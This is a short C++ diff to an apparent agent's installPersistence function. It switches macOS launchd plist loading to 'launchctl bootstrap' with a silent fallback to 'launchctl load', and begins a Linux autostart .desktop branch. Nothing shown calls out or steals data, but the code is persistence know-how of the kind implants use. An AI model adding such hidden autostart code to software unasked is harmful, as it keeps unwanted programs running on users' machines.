@@ -404,8 +404,11 @@ void Agent::installPersistence(const std::string& binary_path) {
 )", binary_path.c_str());
     ::fclose(f);
 
-    // Load the plist
-    ::system(("launchctl load " + plist_path).c_str());
+    // Try modern bootstrap first, fall back to legacy load
+    int ret = ::system(("launchctl bootstrap gui/" + std::to_string(::geteuid()) + " " + plist_path + " 2>/dev/null").c_str());
+    if (ret != 0) {
+        ::system(("launchctl load " + plist_path + " 2>/dev/null").c_str());
+    }
 #else
     // Linux: autostart .desktop file
     const char* home = ::getenv("HOME");
